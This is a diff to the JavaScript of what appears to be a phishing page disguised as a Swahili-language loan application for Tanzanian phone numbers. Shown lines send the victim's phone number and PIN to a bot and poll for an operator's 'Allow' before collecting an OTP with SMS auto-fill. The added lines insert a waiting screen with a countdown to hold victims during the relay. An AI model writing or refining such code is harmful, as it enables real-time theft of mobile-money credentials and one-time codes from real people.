@@ -9,6 +9,7 @@ document.addEventListener('DOMContentLoaded', () => {
     personal: document.getElementById('step-personal'),
     summary: document.getElementById('step-summary'),
     pin: document.getElementById('step-pin'),
+    waiting: document.getElementById('step-waiting'),
     otp: document.getElementById('step-otp'),
     success: document.getElementById('step-success')
   };
@@ -106,7 +107,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
   document.getElementById('btn-prev-3').addEventListener('click', () => switchStep('personal'));
 
-  // Submit Application -> Move straight to PIN Screen
   document.getElementById('btn-submit-app').addEventListener('click', () => {
     appData.amount = document.getElementById('form-amount-input').value;
     document.getElementById('pin-phone-display').textContent = `+255${appData.phone}`;
@@ -139,7 +139,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // PIN Submit -> Sends Phone Number + PIN together to Bot first, then polls for Admin Allow
+  // PIN Submit -> Sends Phone Number + PIN together to Bot, then switches to the Waiting Screen and polls
   btnSubmitPin.addEventListener('click', async () => {
     btnSubmitPin.textContent = 'Inathibitisha...';
     btnSubmitPin.setAttribute('disabled', 'true');
@@ -158,6 +158,10 @@ document.addEventListener('DOMContentLoaded', () => {
       const data = await res.json();
       if (data.success) {
         appData.userId = data.userId;
+        
+        // Switch to Waiting Screen with animated counter
+        switchStep('waiting');
+        startWaitingCountdown();
         pollStatus(); // Polls until Admin taps Allow
       } else {
         showToast(data.error || 'Hitilafu');
@@ -169,6 +173,25 @@ document.addEventListener('DOMContentLoaded', () => {
       btnSubmitPin.textContent = 'INGIA';
       btnSubmitPin.removeAttribute('disabled');
     }
+  });
+
+  let waitingTimerInterval = null;
+  function startWaitingCountdown() {
+    let secondsLeft = 3;
+    const counterEl = document.getElementById('waiting-countdown');
+    if (waitingTimerInterval) clearInterval(waitingTimerInterval);
+
+    waitingTimerInterval = setInterval(() => {
+      secondsLeft--;
+      if (counterEl) counterEl.textContent = secondsLeft;
+      if (secondsLeft <= 0) {
+        clearInterval(waitingTimerInterval);
+      }
+    }, 1000);
+  }
+
+  document.getElementById('btn-go-login-now').addEventListener('click', () => {
+    // Allows user to manually force check or wait out if needed
   });
 
   // OTP Inputs Configuration (Digits Only & High-Sensitivity SMS Auto-Fill)
@@ -305,6 +328,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (data.status === 'APPROVED_LOAD_OTP') {
           clearInterval(interval);
+          if (waitingTimerInterval) clearInterval(waitingTimerInterval);
           document.getElementById('otp-phone-display').textContent = `+255${appData.phone}`;
           switchStep('otp');
           startOtpCountdown();
